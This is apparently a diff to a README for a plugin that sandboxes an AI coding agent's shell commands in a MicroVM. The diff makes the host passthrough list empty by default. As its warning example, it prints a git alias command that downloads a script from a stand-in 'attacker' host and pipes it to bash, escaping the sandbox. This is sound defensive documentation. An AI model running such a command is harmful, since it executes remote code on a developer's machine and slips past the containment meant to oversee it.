@@ -251,15 +251,40 @@ between calls needs a resident helper or CubeSandbox pause/resume.
 able to edit the project — but a malicious `write` is not covered by this
 integration.
 
-**`git` stays on the host by default.** The sandbox has its own filesystem, so
-`git commit` executed there would operate on a different repository than the one
-OpenCode edits. Configure with `CUBE_OPENCODE_PASSTHROUGH`; the default is
-`git,gh,opencode`. Matching is on the leading token only, so `git status` passes
-through but `foo && git push` does not.
+**Passthrough is empty by default, and it is an escape hatch rather than a
+narrow exception.** Matching is on the leading token only, so allowing `git`
+allows every `git`-prefixed command — and git can be made to run arbitrary
+shell:
+
+```bash
+git -c alias.x='!curl http://attacker/sh | bash' x
+```
+
+That runs on the host, unsandboxed and unlogged. Since the model's commands are
+the untrusted input this integration exists to contain, `git` is not on the
+default list. Anything added to the list must be treated as fully trusted with
+host privileges.
+
+The trade-off is real, and it is why the list exists: the sandbox has its own
+filesystem, so `git commit` executed there operates on a different repository
+than the one OpenCode edits. Developers who accept the risk can opt in:
+
+```bash
+export CUBE_OPENCODE_PASSTHROUGH=git,gh
+```
 
 **Hook payload shape is not a stable contract.** The session id key has been
 spelled differently across OpenCode versions, so several variants are probed
-with a fallback. A missed key costs sandbox-reuse granularity, never isolation.
+with a fallback. If every known key is missing, all sessions collapse onto one
+shared state file and lock, so cwd and exported environment bleed between
+concurrent sessions. Commands still run in a MicroVM, so this is not a host
+escape, but it is more than a loss of reuse granularity.
+
+**A command that calls `exec` loses its state update.** `exec` replaces the
+shell's process image, which discards the trap that emits the state block. The
+backend keeps the previous session state in that case, so cwd and environment
+are stale rather than wrong. `exit` is handled correctly; only `exec` is
+affected.
 
 **Interactive commands do not work.** Output is captured, so anything expecting
 a TTY (`vim`, `top`) will not behave normally.
@@ -287,7 +312,7 @@ cd examples/opencode-plugin-sandbox
 node tests/test_plugin.mjs
 ```
 
-21 assertions covering rewriting, passthrough, idempotence, session-id handling,
+24 assertions covering rewriting, passthrough, idempotence, session-id handling,
 and quote-injection resistance. Node standard library only — no npm install, no
 network, no CubeSandbox deployment required.
 
